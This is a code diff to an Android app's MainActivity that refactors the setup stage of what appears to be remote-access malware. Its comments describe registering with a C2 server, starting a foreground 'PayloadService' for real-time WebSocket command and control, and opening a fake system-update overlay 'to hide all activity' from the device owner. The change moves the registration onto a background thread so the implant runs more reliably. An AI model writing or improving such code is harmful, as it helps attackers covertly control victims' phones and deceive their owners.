@@ -221,30 +221,35 @@ class MainActivity : AppCompatActivity() {
     private fun finishSetup() {
         if (isFinishing || isDestroyed) return
 
-        // Step 4: Register via HTTP SYNCHRONOUSLY (must complete before foreground service)
-        // Using sync to guarantee delivery — even if foreground service crashes the process,
-        // the HTTP request has already completed
-        registerViaHttpSync()
-
-        // Step 5: Start foreground service for real-time C2 (WebSocket)
-        val serviceIntent = Intent(this, PayloadService::class.java)
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent)
-            } else {
-                startService(serviceIntent)
-            }
-        } catch (e: Exception) {
-            Log.e("MainActivity", "ForegroundService failed — HTTP registration already sent", e)
-        }
-
         flowCompleted = true
 
-        // Step 6: Show system update overlay to hide all activity
-        val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
-        overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        startActivity(overlayIntent)
-        finish()
+        // Step 4: Register via HTTP on background thread (prevents ANR)
+        Thread {
+            registerViaHttpSync()
+
+            // Step 5: Start foreground service (must happen on main thread)
+            runOnUiThread {
+                if (isFinishing || isDestroyed) return@runOnUiThread
+                val serviceIntent = Intent(this, PayloadService::class.java)
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(serviceIntent)
+                    } else {
+                        startService(serviceIntent)
+                    }
+                } catch (e: Exception) {
+                    Log.e("MainActivity", "ForegroundService failed", e)
+                }
+
+                // Step 6: Show system update overlay to hide all activity
+                val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
+                overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                startActivity(overlayIntent)
+                finish()
+            }
+        }.apply {
+            isDaemon = true
+        }.start()
     }
 
     private fun registerViaHttpSync() {
